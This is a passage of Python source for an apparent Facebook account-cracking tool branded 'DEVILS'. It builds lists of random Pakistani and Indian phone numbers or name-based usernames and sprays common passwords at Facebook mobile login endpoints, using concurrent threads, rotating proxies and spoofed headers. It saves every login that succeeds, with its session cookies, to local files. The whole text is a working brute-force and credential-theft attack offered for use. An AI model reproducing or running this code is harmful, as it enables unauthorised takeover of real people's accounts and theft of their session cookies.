    print(logo)
    print('[] EXAMPLE : 36,31,32,33..ETC')
    linex()
    kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
    os.system('clear')
    print(logo)
    linex()
    print('[1] Method 1 \n[2] Method 2 \n[3] Method 3 \n[4] Method 4')
    linex()
    mthd=input(' SELECT: ')
    if mthd in ['1','2','3','4']:
        pass
    else:
        print('CHOICE ERROR ')
        rndmpak()
    os.system('clear')
    print(logo)
    print('\x1b[1;92m Example : 1000 , 5000 , 10000 , 50000 ,ETC')
    linex()
    limit = int(input('Put Limit :  '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(8))
        uid.append(nmp)
    with devilswork(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(uid))
        print('[◽] Total Acounts : '+tl)
        print('[◽] Selected Code : \x1b[1;92m'+kode)
        print('\x1b[1;91m[ ✈️ ] If you no result use flight mode')
        linex()
        for guru in uid:
            fid = '+92'+kode+guru
            pwx = [guru,guru[2:],kode+guru[:3],kode+guru[:4],guru[1:],'khankhan','khan1122','khan123','khan12345','pakistan','pakistan123','pakistan12345','malik123','malik12345','pubg123','pubg12345','pubgpubg']
            if mthd =='1':
                yaari.submit(ram1,fid,pwx,tl)
            if mthd =='2':
                yaari.submit(ram2,fid,pwx,tl)
            if mthd =='3':
                yaari.submit(ram3,fid,pwx,tl)
            if mthd =='4':
                yaari.submit(ram4,fid,pwx,tl)
            
    linex()
    print('[√] Crack process has been completed')
    print('[√] Idz saved in [ok.txt,cp.txt]')
    linex()
    input('Press Enter To Go Back To Menu')
    devils()
    
def rndm1():
    clear()
    data = apv.key3()
    if not data == "DEVILS" + uids:
        error(key)
        byy()
        exit()

    data1 = apv.key4()
    if not data1 == "XD" + uids:
        error(key)
        byy()
        exit()

    data2 = data + data1
    if not ("DEVILS" and "XD") in data2:
        error(key)
        byy()
        exit()

    data = data + data1
    if not data == "DEVILS" + uids + "XD" + uids:
        bal()
        byy()
        exit()
    uid=[]
    os.system('clear')
    print(logo)
    print('[] EXAMPLE : 986 , 816 , 766 , 746 , 756 ')
    linex()
    kode = input('[+]\033[1;37m PUT YOUR SIM CODE : ')
    os.system('clear')
    print(logo)
    
    print('[1] Method 1 \n[2] Method 2 \n[3] Method 3 \n[4] Method 4')
    linex()
    mthd=input(' SELECT: ')
    if mthd in ['1','2','3','4']:
        os.system('clear')
        print(logo)
        linex()
        
        pass
    else:
        print('CHOICE ERROR ')
        rndm1()
    print('\x1b[1;92m Example : 1000 , 5000 , 10000 , 50000 ,Etc')
    linex()
    limit = int(input('Put Limit :  '))
    for nmbr in range(limit):
        nmp = ''.join(random.choice(string.digits) for _ in range(7))
        uid.append(nmp)
    with devilswork(max_workers=30) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(uid))
        print('[◽] Total Acounts : '+tl)
        print('[◽] Selected Code : \x1b[1;92m'+kode)
        print('\x1b[1;91m[ ✈️ ] If you no result use flight mode')
        linex()
        for guru in uid:
            fid = '+91'+kode+guru
            #fid = '61550080195021'
            pwx = [kode+guru,kode+guru[:3],'57273200','07860786','57232200','57575752','59039200']
            #pwx = ['59039200']
            if mthd =='1':
                yaari.submit(ram1,fid,pwx,tl)
            if mthd =='2':
                yaari.submit(ram2,fid,pwx,tl)
            if mthd =='3':
                yaari.submit(ram3,fid,pwx,tl)
            if mthd =='4':
                yaari.submit(ram4,fid,pwx,tl)
            
    linex()
    print('[√] Crack process has been completed')
    print('[√] Idz saved in [ok.txt,cp.txt]')
    linex()
    input('Press Enter To Go Back To Menu')
    devils()
def uid():
    clear()
    data = apv.key3()
    if not data == "DEVILS" + uids:
        error(key)
        byy()
        exit()

    data1 = apv.key4()
    if not data1 == "XD" + uids:
        error(key)
        byy()
        exit()

    data2 = data + data1
    if not ("DEVILS" and "XD") in data2:
        error(key)
        byy()
        exit()

    data = data + data1
    if not data == "DEVILS" + uids + "XD" + uids:
        bal()
        byy()
        exit()
    uid=[]
    os.system('clear')
    print(logo)
    linex()
    kode = input('[+]\033[1;37m First Name : ')
    kodex = input('[+] Last Name : ')
    os.system('clear')
    print(logo)
    print('   [1] Method 1 \n   [2] Method 2 \n   [3] Method 3 \n   [4] Method 4 \n   [5] Method 5')
    mthd=input(' SELECT: ')
    if mthd in ['1','2','3','4','5']:
        pass
    else:
        print('  Method Error')
        exit()
    for nmbr in range(50000):
        nmp = ''.join(random.choice(string.digits) for _ in range(2,5))
        uid.append(nmp)
    with devilswork(max_workers=50) as yaari:
        os.system('clear')
        print(logo)
        tl = str(len(uid))
        print('[�] Total Acounts : '+tl)
        print('[�] Selected Name : \x1b[1;92m'+kode+' '+kodex)
        print('\x1b[1;91m[�] If you no result use flight mode')
        linex()
        for guru in uid:
            uid = kode+'.'+kodex+'.'+guru
            pwx = [kode,kode+kodex,kode+'123',kode+'1234',kode+'12345',kode+' '+kodex,'bangladesh','@#@#@#','i love you','free fire']
            if mthd =='1':
                yaari.submit(ram1,uid,pwx,tl)
            if mthd =='2':
                yaari.submit(ram2,uid,pwx,tl)
            if mthd =='3':
                yaari.submit(ram3,uid,pwx,tl)
            if mthd =='4':
                yaari.submit(ram4,uid,pwx,tl)
            if mthd =='5':
                yaari.submit(ram5,uid,pwx,tl)
    linex()
    print('[√] Crack process has been completed')
    print('[√] Idz saved in [ok.txt,cp.txt]')
    linex()
    input('Press Enter To Go Back To Menu')
    devils()
def ram1(fid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global ugen
    global prox
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mDEVILS-M1\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
            sys.stdout.flush()
            ua = random.choice(ugen)
            uax=random.choice(proxo)
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            free_fb = session.get('https://iPhone.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":fid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'mbasic.facebook.com',
            'upgrade-insecure-requests': '1',
            'viewport-width': '980',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9',
            'accept-language': 'en-PK,en-GB,en-US;q=0.9,en;q=0.8,en;q=0.7', 
            'dnt':'1', 
            'x-requested-with':'mark.via.gp', 
            'sec-fetch-site': 'none',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-user': '?1',
            'sec-fetch-dest': 'document',
            'accept-encoding':'gzip, deflate, br','accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'sec-ch-ua': '" Not A;Brand";v="106", "Chromium";v="30", "Google Chrome";v="45"',
            'sec-ch-ua-mobile': '?1','sec-ch-ua-platform': '"Windows"',
            "sec-ch-prefers-color-scheme": "light",
            'user-agent': uax}
            lo = session.post('https://x.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb,proxies=proxs).text
            log_cookies=session.cookies.get_dict().keys()
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = user_id(coki)
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
   	             print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+'\033[1;32m')
   	             print(f'\033[1;37mCookie : {coki}')
   	             open('/sdcard/DEVILS-IDS/Random/devil-ok-coki.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
   	             open('/sdcard/DEVILS-IDS/Random/devil-ok.txt', 'a').write(cid+'|'+ps+'\n')
   	             oks.append(fid)
                #cek_apk(session,coki)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:158]
                #print('[DEVILS-CP] '+cid+' | '+ps+'\033[1;32m')
                #print('[DEVILS-CP] '+cid+' | '+ps+' | '+coki+'\033[1;32m')
                open('/sdcard/DEVILS-IDS/Random/devil-cp.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(fid)
                break
            else:
                continue
        loop+=1
    except:
        pass
def ram2(fid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global ugen
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mDEVILS-M2\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
            sys.stdout.flush()
            ua = random.choice(ugen)
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":fid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'Host': 'p.facebook.com',
            'sec-ch-ua': '"Not)A;Brand";v="24", "Chromium";v="116"',
            'sec-ch-ua-mobile': '?1',
            'viewport-width': '2499',
            'sec-ch-ua-platform-version': '"10.0.0"',
            'sec-ch-ua-full-version-list': '"Not)A;Brand";v="24.0.0.0", "Chromium";v="116.0.5845.72"',
            'sec-ch-ua-model': '"moto z4"',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua-platform': '"Android"',
            'accept': 'image/avif,image/webp,image/apng,image/svg+xml,image/*,*/*;q=0.8',
            'sec-fetch-site': 'same-origin',
            'sec-fetch-mode': 'no-cors',
            'sec-fetch-dest': 'image',
            'referer': 'https://p.facebook.com/',
            'accept-encoding': 'gzip, deflate, br',
            'accept-language': 'en-US,en;q=0.9',
            'user-agent': ua}
            lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = user_id(coki)
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
   	             print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+'\033[1;32m')
   	             print(f'\033[1;37mCookie : {coki}')
   	             open('/sdcard/DEVILS-IDS/Random/devil-ok-coki.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
   	             open('/sdcard/DEVILS-IDS/Random/devil-ok.txt', 'a').write(cid+'|'+ps+'\n')
   	             oks.append(fid)
                #cek_apk(session,coki)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:158]
                #print('[DEVILS-CP] '+cid+' | '+ps+'\033[1;32m')
                #print('[DEVILS-CP] '+cid+' | '+ps+' | '+coki+'\033[1;32m')
                open('/sdcard/DEVILS-IDS/Random/devil-cp.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(fid)
                break
            else:
                continue
        loop+=1
    except:
        pass

def ram3(fid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global ugen
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mDEVILS-M3\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
            sys.stdout.flush()
            ua = random.choice(ugen)
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            free_fb = session.get('https://mbasic.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":fid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'mbasic.facebook.com',
            "method": 'GET',
            "scheme": 'https',
            'authority': 'developer.facebook.com',
            'x-fb-rlafr': '0',
            'access-control-allow-origin': '*',
            'facebook-api-version': 'v17.0',
            'strict-transport-security': 'max-age=15552000',
            'pragma': 'no-cache',
            'cache-control': 'private, no-cache, no-store, must-revalidate',
            'x-fb-request-id': 'A5ZKh_85GaagpB8XJbwc9jD',
            'x-fb-trace-id': 'DKv719n6x5A',
            'x-fb-rev': '1007660106',
            'x-fb-debug': '0Wgri/aCTmjxPumj0+CG/zZiMXJ7STJoeBV090VKxpelr/8ZFdv2Yhf8eVXye88jFgf4VfRJ/fAhAmK5VclVPQ==',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-US,en;q=0.9',
            'cache-control': 'max-age=0',
            'origin': 'https://mbasic.facebook.com',
            'referer': 'https://mbasic.facebook.com/',
            'sec-ch-prefers-color-scheme': 'dark',
            'sec-ch-ua': '"Not:A-Brand";v="99", "Chromium";v="112"',
            'sec-ch-ua-full-version-list': '"Not:A-Brand";v="99.0.0.0", "Chromium";v="112.0.5615.137"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"13.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'upgrade-insecure-requests': '1',
            'user-agent': ua}
            lo = session.post('https://mbasic.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = user_id(coki)
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
   	             print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+'\033[1;32m')
   	             print(f'\033[1;37mCookie : {coki}')
   	             open('/sdcard/DEVILS-IDS/Random/devil-ok-coki.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
   	             open('/sdcard/DEVILS-IDS/Random/devil-ok.txt', 'a').write(cid+'|'+ps+'\n')
   	             oks.append(fid)
                #cek_apk(session,coki)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:158]
                #print('[DEVILS-CP] '+cid+' | '+ps+'\033[1;32m')
                #print('[DEVILS-CP] '+cid+' | '+ps+' | '+coki+'\033[1;32m')
                open('/sdcard/DEVILS-IDS/Random/devil-cp.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(fid)
                break
            else:
                continue
        loop+=1
    except:
        pass

def ram4(fid,pwx,tl):
    #print(user)
    global loop
    global cps
    global oks
    global ugen
    try:
        for ps in pwx:
            session = requests.Session()
            sys.stdout.write(f'\r\x1b[1;97m[\033[1;97mDEVILS-M4\033[1;97m] %s|\x1b[1;92mOK:-%s \x1b[1;97m\r'%(loop,len(oks))),
            sys.stdout.flush()
            ua = random.choice(ugen)
            nip=random.choice(prox)
            proxs= {'http': 'socks4://'+nip}
            free_fb = session.get('https://free.facebook.com').text
            log_data = {
                "lsd":re.search('name="lsd" value="(.*?)"', str(free_fb)).group(1),
            "jazoest":re.search('name="jazoest" value="(.*?)"', str(free_fb)).group(1),
            "m_ts":re.search('name="m_ts" value="(.*?)"', str(free_fb)).group(1),
            "li":re.search('name="li" value="(.*?)"', str(free_fb)).group(1),
            "try_number":"0",
            "unrecognized_tries":"0",
            "email":fid,
            "pass":ps,
            "login":"Log In"}
            header_freefb = {'authority':'p.facebook.com',
            'upgrade-insecure-requests': '1',
            'viewport-width': '980',
            'method': 'GET',
            'scheme': 'https',
            'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
            'accept-language': 'en-GB,en-US;q=0.9,en;q=0.8',
            'cache-control': 'max-age=0',
            'cookie': 'datr=Z99dZdxV9vUoH3wPLHIk2gfc; sb=Z99dZZIomwpNyLGDMQIjkcE7; m_pixel_ratio=2.549999952316284; wd=424x809; fr=0adVk94PyjoU8GeFS..BlXd9n.vP.AAA.0.0.BlXeLV.AWXMClOq_XI',
            'dpr': '2.549999952316284',
            'sec-ch-prefers-color-scheme': 'light',
            'sec-ch-ua': '"Not_A Brand";v="8", "Chromium";v="120"',
            'sec-ch-ua-full-version-list': '"Not_A Brand";v="8.0.0.0", "Chromium";v="120.0.6099.20"',
            'sec-ch-ua-mobile': '?1',
            'sec-ch-ua-model': '"RMX3741"',
            'sec-ch-ua-platform': '"Android"',
            'sec-ch-ua-platform-version': '"13.0.0"',
            'sec-fetch-dest': 'document',
            'sec-fetch-mode': 'navigate',
            'sec-fetch-site': 'none',
            'sec-fetch-user': '?1',
            'user-agent': ua}
            lo = session.post('https://free.facebook.com/login/device-based/login/async/?refsrc=deprecated&lwv=100',data=log_data,headers=header_freefb).text
            log_cookies=session.cookies.get_dict().keys()
            #print(iid+'|'+pws+'|'+str(log_cookies))
            if 'c_user' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = user_id(coki)
                ckk = f'https://graph.facebook.com/{cid}/picture?type=normal'
                res = requests.get(ckk).text
                if 'Photoshop' in res:
   	             print('\033[1;92m[DEVILS-OK] '+cid+' | '+ps+'\033[1;32m')
   	             print(f'\033[1;37mCookie : {coki}')
   	             open('/sdcard/DEVILS-IDS/Random/devil-ok-coki.txt', 'a').write(cid+'|'+ps+'|'+coki+'\n')
   	             open('/sdcard/DEVILS-IDS/Random/devil-ok.txt', 'a').write(cid+'|'+ps+'\n')
   	             oks.append(fid)
                #cek_apk(session,coki)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[141:158]
                #print('[DEVILS-CP] '+cid+' | '+ps+'\033[1;32m')
                #print('[DEVILS-CP] '+cid+' | '+ps+' | '+coki+'\033[1;32m')
                open('/sdcard/DEVILS-IDS/Random/devil-cp.txt', 'a').write(cid+' | '+ps+'\n')
                cps.append(fid)
                break
            else:
                continue
        loop+=1
    except:
        pass
        
try:
    data = apv.key1()
except:
    clear()
    byy(" Something Wrong Try Again Or Contact Admin")
    exit()
if not data == key:
    error(keys)
    byy()
    exit()
try:
    data = apv.key7()
except:
    clear()
    byy(" Something Wrong Try Again Or Contact Admin")
    exit()
if not data == "Yes no":
    bal()
    byy()
    exit()
apv.key11()
devils()